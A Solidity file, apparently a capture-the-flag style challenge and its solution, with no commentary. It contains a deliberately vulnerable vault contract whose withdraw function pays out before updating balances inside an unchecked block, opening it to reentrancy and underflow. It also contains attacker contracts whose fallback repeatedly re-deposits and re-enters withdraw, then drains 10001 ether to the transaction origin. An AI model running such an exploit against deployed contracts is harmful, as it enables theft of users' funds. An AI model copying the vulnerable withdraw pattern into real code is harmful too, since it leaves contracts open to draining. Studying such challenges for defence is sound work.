// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient funds");
        (bool ok, ) = msg.sender.call{ value: amount }("");
        require(ok, "transfer failed");
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface Target {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract OptimizedAttackerSecurity101 {
    constructor(Target target) payable {
        OptimizedAttackerSecurity102 attacker = new OptimizedAttackerSecurity102();
        attacker.attack{ value: 1 ether }(target);
    }
}

contract OptimizedAttackerSecurity102 {
    uint256 balance = 1 ether;

    function attack(Target target) external payable {
        target.deposit{ value: msg.value }();
        target.withdraw(1 ether);
    }

    fallback() external payable {
        if (msg.value > 8192 ether){
            payable(tx.origin).transfer(10001 ether);
        }else{
            Target(msg.sender).deposit{ value: msg.value }();
            if (msg.value * 2 > 8192 ether)
                Target(msg.sender).withdraw(10001 ether);
            else
                Target(msg.sender).withdraw(msg.value * 2);
        }
    }
}
